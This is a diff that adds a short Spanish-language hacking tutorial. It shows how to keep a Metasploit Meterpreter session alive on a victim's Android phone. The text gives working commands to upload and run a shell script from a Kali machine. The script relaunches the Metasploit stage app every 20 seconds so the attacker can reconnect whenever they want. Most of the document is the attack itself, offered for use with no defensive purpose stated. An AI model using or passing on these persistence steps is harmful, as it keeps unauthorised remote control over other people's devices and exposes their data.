@@ -1,0 +1,33 @@
+
+Bien ahora debemos crear persistencia para conectarnos a nuestra victima cuando queramos. Para eso debemos ir al directorio sdcard de nuestro Android.
+sesion de meterpreter
+poner todos estos comandos 
+
+> cd /
+
+> cd /sdcard/Download
+
+Abrimos una terminal en nuestra maquina kali y creamos un archivo con el nombre persistence.sh  dentro de el copiamos el siguiente código.
+
+#!/bin/bash
+while :
+do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
+sleep 20
+done
+
+volvemos a la meterpreter y una vez estamos en la ruta /sdcard/Download usamos el siguiente comando.
+
+> upload /root/Desktop/persistence.sh
+
+Luego abrimos una shell usando.
+
+> shell
+
+Vamos a la ruta de nuestro .sh y lo ejecutamos.
+
+
+> cd /
+
+> cd /sdcard/Download
+
+> sh persistence.sh                                                                             
